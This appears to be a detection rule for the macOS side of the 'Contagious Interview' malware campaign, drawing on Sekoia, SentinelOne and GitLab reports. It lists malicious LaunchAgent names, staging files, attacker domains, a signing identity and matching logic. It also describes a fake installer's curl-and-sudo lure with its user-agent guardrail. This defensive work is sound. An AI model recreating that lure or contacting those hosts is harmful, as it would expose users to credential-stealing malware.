description: Contagious Interview reaches Macs as readily as Windows machines. Sekoia documents the macOS lure writing coremedia.sh and a VCam archive into /var/tmp and GolangGhost persisting through /Library/LaunchAgents/com.drive.plist. Windows coverage of FlexibleFerret and GolangGhost is in ClickFake Interview.

SentinelOne documents a dropper named versus.pkg whose postinstall script logs to /private/tmp/postinstall.log, stages executables in /var/tmp and installs a launch agent labelled com.zoom.plist (the genuine Zoom agent is us.zoom.ZoomDaemon.plist) pointing at /private/var/tmp/logd. It was signed with Apple Team ID 58CD8AD5Z4 at the time of reporting.

GitLab's September 2025 note records the BeaverTail installer lure: a curl command with certificate checking disabled and a numeric user-agent guardrail, fetching /var/tmp/nvidia.pkg from nvidiasdk.fly[.]dev and installing it with sudo, with files at ~/.npc and ~/.myvars. A Zoom-labelled launch agent executing from a temporary directory is close to conclusive.
logic: Collect: file writes, process starts and DNS or network events on macOS endpoints, plus launchd and signing state through osquery
Match: file written is a com.zoom.plist or com.drive.plist LaunchAgent, or staged coremedia.sh, VCam.zip, nvidia.pkg, versus.pkg, logd, .npc
Match: or command line names those staging paths, the numeric user-agent -A 204, or the "This file is damaged" decoy dialog
Match: or lookup of zoom.callservice.us, businesshire.top, nvidiasdk.fly.dev or api.smartdriverfix.cloud (lower fidelity, rotates)
Match: or, osquery only, a launch agent running from /var/tmp or a binary signed with Apple Team ID 58CD8AD5Z4 (lower fidelity)
Report: Macs with the signal kinds hit, most kinds first
technique_scope: Launch Agent persistence (MITRE ATT&CK T1543.001), masquerading as Zoom and operating-system components (T1036.005), user execution of a pasted terminal command (T1204.004) or a fake installer package (T1204.002), and staging in world-writable temporary directories.
data_sources: macOS EDR file and process telemetry

indicators.note: Written by the macOS ClickFake Interview lure command (Sekoia).
GolangGhost persistence on macOS (Sekoia).
FlexibleFerret persistence label. The genuine Zoom launch agent is us.zoom.ZoomDaemon.plist (SentinelOne).
Executable the com.zoom.plist launch agent targets, named to resemble the system log daemon (SentinelOne).
Progress log written by the versus.pkg postinstall script (SentinelOne).
Apple Installer package that drops FlexibleFerret (SentinelOne).

indicators.value: This file is damaged and cannot be opened
indicators.note: Decoy error the dropper shows, imitating Gatekeeper (SentinelOne).
Valid developer identity the FlexibleFerret sample was signed with at the time of reporting (SentinelOne).
Contacted by the fake zoom binary (SentinelOne).
Reproduced from GitLab's tech note. The numeric user-agent is an execution guardrail: a mismatched value receives a benign decoy.
InvisibleFerret entry point and the password-exfiltration file in the September 2025 variant (GitLab).

Staging host for both the Windows and macOS ClickFake Interview commands (Sekoia).

queries.note: A Mac with a LaunchAgent or staging-file hit, or several signal kinds, shows the Contagious Interview macOS payload; a domain hit alone shows only that the host was contacted.
